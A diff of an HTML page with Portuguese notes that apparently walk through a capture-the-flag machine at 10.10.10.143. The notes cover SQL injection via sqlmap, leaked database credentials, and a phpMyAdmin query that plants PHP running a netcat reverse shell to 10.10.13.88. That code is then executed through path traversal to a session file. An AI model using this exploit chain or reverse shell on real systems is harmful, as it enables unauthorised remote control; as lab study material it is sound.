@@ -18,7 +18,7 @@
 	    <p>sql injection nos quartos, usa sqlmap</p>
 	    <p>vai achar o usuario DBadmin com senha imissyou</p>
 	    <p>conecta no 10.10.10.143/phpmyadmin/server_sql.php</p>
-	    <p>exploit: select '<?php system(&quot;nc -e /bin/bash 10.10.13.88 12345&quot;)?>'</p>
+	    <p>exploit: select '&lt;?php system(&quot;nc -e /bin/bash 10.10.13.88 12345&quot;)?&gt;'</p>
 	    <p>intercepta antes de dar go e pega o valor do cookie phpmyadmin</p>
 	    <p>vai na page http://10.10.10.143/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_TOKENCOOKIEPHPMYADMINAQUI</p>
 	    <p>isso vai executar o c&oacute;digo que foi passado no system(&quot;...&quot;)</p>
